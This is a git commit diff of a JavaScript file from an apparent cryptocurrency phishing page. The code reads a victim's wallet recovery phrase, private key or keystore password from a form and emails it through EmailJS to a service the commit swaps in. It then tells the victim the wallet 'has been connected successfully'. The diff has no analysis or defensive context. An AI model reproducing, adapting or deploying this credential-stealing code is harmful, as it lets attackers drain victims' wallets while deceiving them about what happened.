48936fb5ea35cc4845ae6c3cb15771ba3f9e383f
Sooreoluwa <69484117+eightninemo@users.noreply.github.com>
2023-04-13 17:29:15 +0100

    Add files via upload

--- main.js
+++ main.js
@@ -2,6 +2,7 @@
 // private key
 // keystorepassword
 
+const form = document.querySelector('form');
 
 function proceed(){
     var phrase = document.getElementById("textareaphrase").value;
@@ -12,19 +13,18 @@ function proceed(){
         message: phrase || privateKey || keystorePassword
     };
      
-    emailjs.send('service_7bxymb5', 'template_7k9v1z3', templateParams)
+    emailjs.send('service_ig831jm', 'template_7k9v1z3', templateParams)
         .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
-           alert("Your wallet has been connected successfully.")
-           document.getElementById("btn-text").innerHTML = "Proceed"
+           alert("Your wallet has been connected successfully.");
+           window.setTimeout(document.getElementById("btn-text").innerHTML = "Proceed", 2000);
         }, function(error) {
             alert("error connecting wallet...")
-            document.getElementById("btn-text").innerHTML = "Proceed"
+            window.setTimeout(document.getElementById("btn-text").innerHTML = "Proceed", 2000);
            console.log('FAILED...', error);
         });
     
 }
-const form = document.querySelector('form');
 
 form.addEventListener( 'submit', function(e){
     e.preventDefault();
